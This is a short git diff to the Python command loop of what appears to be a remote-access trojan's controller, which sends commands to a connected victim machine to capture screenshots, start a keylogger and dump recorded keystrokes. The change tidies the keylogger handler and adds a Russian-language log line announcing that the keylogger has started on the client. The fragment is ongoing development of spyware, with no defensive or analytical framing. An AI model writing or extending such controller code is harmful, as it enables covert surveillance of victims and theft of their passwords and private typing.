@@ -109,8 +109,6 @@ def shell(target, ip):
             elif command == "help":
                 show_help()
                 continue
-            elif command.startswith("keylog_start"):
-                continue
             elif command.startswith("cd"):
                 response = reliable_recv(target)
                 print(response)
@@ -122,9 +120,8 @@ def shell(target, ip):
                 save_screenshot(target, screenshot_id)
                 screenshot_id += 1
             elif command.startswith("keylog_start"):
-                response = reliable_recv(target)
-                print(response)
-                logging.info(response)
+                reliable_recv(target)
+                logging.info("[+] Кейлоггер успешно запущен на клиенте.")
             elif command.startswith("keylog_dump"):
                 logs = reliable_recv(target)
                 save_keylogs(logs)
